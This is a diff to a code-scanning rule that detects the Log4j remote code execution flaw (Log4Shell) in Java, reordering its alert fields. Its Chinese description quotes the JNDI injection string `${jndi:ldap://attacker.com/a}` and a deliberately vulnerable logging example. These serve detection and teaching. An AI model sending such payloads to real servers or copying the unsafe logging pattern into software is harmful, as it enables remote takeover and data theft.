@@ -115,8 +115,6 @@ $sink #{
 }->as $high;
 
 alert $high	for {
-	title: "Detect Java Log4j Remote Code Execution Vulnerability",
-	title_zh: "检测Java Log4j远程代码执行漏洞",
 	solution: <<<CODE
 ### 修复建议
 
@@ -203,6 +201,8 @@ CODE
 	level: "high",
 	message: "发现Java代码中存在Log4j远程代码执行漏洞，并且数据流中间没有进行任何过滤。",
 	risk: "rce",
+	title: "Detect Java Log4j Remote Code Execution Vulnerability",
+	title_zh: "检测Java Log4j远程代码执行漏洞",
 }
 
 
@@ -212,6 +212,44 @@ $sink #{
 
 $result - $high  as $low;
 alert $low	for {
+	desc: <<<CODE
+### 漏洞描述
+
+1. **漏洞原理**
+   Log4j是一个广泛使用的Java日志记录库。某些版本的Log4j（特别是2.0-beta9到2.17.0之间的版本）存在严重的安全漏洞（Log4Shell，CVE-2021-44228等）。该漏洞源于Log4j对JNDI（Java Naming and Directory Interface）查找功能的处理不当。当应用程序在日志消息中包含了可以通过JNDI解析的恶意字符串时，攻击者可以远程加载并执行恶意Java类，实现远程代码执行（RCE）。
+
+2. **触发场景**
+   攻击者可以通过各种方式将恶意字符串注入到被Log4j记录的数据中，例如HTTP请求头（如User-Agent、Referer）、POST请求参数、URL参数、用户输入表单数据等。当应用程序使用脆弱版本的Log4j记录这些包含恶意JNDI查找字符串（如 `${jndi:ldap://attacker.com/a}`）的数据时，Log4j会尝试解析并执行该查找，连接到攻击者控制的LDAP服务器，并加载恶意Java类。
+
+   // 存在漏洞的代码示例
+   ```java
+   import org.apache.logging.log4j.LogManager;
+   import org.apache.logging.log4j.Logger;
+   import javax.servlet.http.HttpServletRequest;
+
+   public class VulnerableLog4jExample {
+       private static final Logger logger = LogManager.getLogger(VulnerableLog4jExample.class);
+
+       public String handleRequest(HttpServletRequest request) {
+           String userInput = request.getParameter("data");
+           logger.info("Received data: " + userInput); // 直接记录用户输入
+           return "Processed";
+       }
+   }
+   ```
+
+3. **潜在影响**
+   攻击者可以利用该漏洞在目标服务器上执行任意代码，导致：
+    - 完全控制受影响的服务器。
+    - 窃取敏感数据。
+    - 安装后门、勒索软件或其他恶意软件。
+    - 进一步渗透内网。
+    - 拒绝服务（DoS）。
+
+CODE
+	level: "low",
+	message: "发现Java代码中可能存在Log4j远程代码执行漏洞。",
+	risk: "rce",
 	title: "Detect Java Log4j Remote Code Execution Vulnerability",
 	title_zh: "检测Java Log4j远程代码执行漏洞",
 	solution: <<<CODE
@@ -262,44 +300,6 @@ alert $low	for {
 4. **最小化应用程序权限**
    在应用部署环境中，限制运行应用程序的用户或服务账号的权限，即使发生漏洞，也能限制攻击者能造成的损害。
 CODE
-	desc: <<<CODE
-### 漏洞描述
-
-1. **漏洞原理**
-   Log4j是一个广泛使用的Java日志记录库。某些版本的Log4j（特别是2.0-beta9到2.17.0之间的版本）存在严重的安全漏洞（Log4Shell，CVE-2021-44228等）。该漏洞源于Log4j对JNDI（Java Naming and Directory Interface）查找功能的处理不当。当应用程序在日志消息中包含了可以通过JNDI解析的恶意字符串时，攻击者可以远程加载并执行恶意Java类，实现远程代码执行（RCE）。
-
-2. **触发场景**
-   攻击者可以通过各种方式将恶意字符串注入到被Log4j记录的数据中，例如HTTP请求头（如User-Agent、Referer）、POST请求参数、URL参数、用户输入表单数据等。当应用程序使用脆弱版本的Log4j记录这些包含恶意JNDI查找字符串（如 `${jndi:ldap://attacker.com/a}`）的数据时，Log4j会尝试解析并执行该查找，连接到攻击者控制的LDAP服务器，并加载恶意Java类。
-
-   // 存在漏洞的代码示例
-   ```java
-   import org.apache.logging.log4j.LogManager;
-   import org.apache.logging.log4j.Logger;
-   import javax.servlet.http.HttpServletRequest;
-
-   public class VulnerableLog4jExample {
-       private static final Logger logger = LogManager.getLogger(VulnerableLog4jExample.class);
-
-       public String handleRequest(HttpServletRequest request) {
-           String userInput = request.getParameter("data");
-           logger.info("Received data: " + userInput); // 直接记录用户输入
-           return "Processed";
-       }
-   }
-   ```
-
-3. **潜在影响**
-   攻击者可以利用该漏洞在目标服务器上执行任意代码，导致：
-    - 完全控制受影响的服务器。
-    - 窃取敏感数据。
-    - 安装后门、勒索软件或其他恶意软件。
-    - 进一步渗透内网。
-    - 拒绝服务（DoS）。
-
-CODE
-	level: "low",
-	message: "发现Java代码中可能存在Log4j远程代码执行漏洞。",
-	risk: "rce",
 }
 
 
